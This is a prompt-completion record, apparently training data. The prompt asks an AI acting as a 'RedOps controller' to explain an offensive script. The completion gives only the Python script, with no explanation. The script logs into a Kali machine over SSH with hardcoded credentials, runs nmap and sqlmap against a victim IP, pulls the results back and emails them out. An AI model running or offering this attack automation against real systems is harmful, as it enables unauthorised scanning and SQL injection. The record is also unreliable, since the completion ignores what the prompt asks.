{"prompt": "Act as an AI RedOps controller. Here is a Python script that connects to an attacker machine via SSH, executes red team operations, gathers logs, and sends a report to a monitoring AI. Explain the function of this script and how it contributes to offensive automation:", "completion": "\nimport paramiko\nimport time\nimport os\nfrom email.message import EmailMessage\nimport smtplib\nimport ssl\n\ncontroller_email = \"redops.controller@example.com\"\ncontroller_password = \"securepassword\"\nreceiver_email = \"blueshield.monitor@example.com\"\n\nvictim_ip = \"192.168.80.133\"\nattacker_ip = \"192.168.80.134\"\nattacker_username = \"kali\"\nattacker_password = \"kali\"\n\ndef ssh_execute_command(ip, username, password, command):\n    try:\n        ssh = paramiko.SSHClient()\n        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n        ssh.connect(ip, username=username, password=password)\n        stdin, stdout, stderr = ssh.exec_command(command)\n        output = stdout.read().decode()\n        ssh.close()\n        return output\n    except Exception as e:\n        return str(e)\n\ndef main():\n    print(\"[+] Connecting to Attacker Machine via SSH...\")\n    tools_check = ssh_execute_command(attacker_ip, attacker_username, attacker_password, \"which nmap sqlmap hydra nikto whatweb wfuzz\")\n    print(\"[+] Offensive Tools Installed:\\n\", tools_check)\n\n    print(\"[+] Running Attack Commands...\")\n    ssh_execute_command(attacker_ip, attacker_username, attacker_password, f\"nmap -A -T4 {victim_ip} -oN /home/kali/nmap_report.txt\")\n    ssh_execute_command(attacker_ip, attacker_username, attacker_password, f\"sqlmap -u http://{victim_ip} --batch --output-dir=/home/kali/sqlmap_results\")\n\n    time.sleep(10)\n\n    print(\"[+] Pulling Reports from Attacker Machine\")\n    os.system(f\"scp kali@{attacker_ip}:/home/kali/nmap_report.txt ./nmap_report.txt\")\n    os.system(f\"scp -r kali@{attacker_ip}:/home/kali/sqlmap_results ./sqlmap_results\")\n\n    email_subject = \"RedOps Attack Report\"\n    email_body = \"Reports attached: nmap and sqlmap results.\"\n    em = EmailMessage()\n    em['From'] = controller_email\n    em['To'] = receiver_email\n    em['Subject'] = email_subject\n    em.set_content(email_body)\n\n    with open(\"nmap_report.txt\", \"rb\") as f:\n        em.add_attachment(f.read(), maintype=\"application\", subtype=\"octet-stream\", filename=\"nmap_report.txt\")\n\n    zip_path = \"sqlmap_results.zip\"\n    os.system(f\"zip -r {zip_path} ./sqlmap_results\")\n    with open(zip_path, \"rb\") as f:\n        em.add_attachment(f.read(), maintype=\"application\", subtype=\"zip\", filename=\"sqlmap_results.zip\")\n\n    context = ssl.create_default_context()\n    with smtplib.SMTP_SSL(\"smtp.example.com\", 465, context=context) as smtp:\n        smtp.login(controller_email, controller_password)\n        smtp.send_message(em)\n        print(\"[+] Report Sent to BlueShield Monitor\")\n\nif __name__ == \"__main__\":\n    main()\n"}
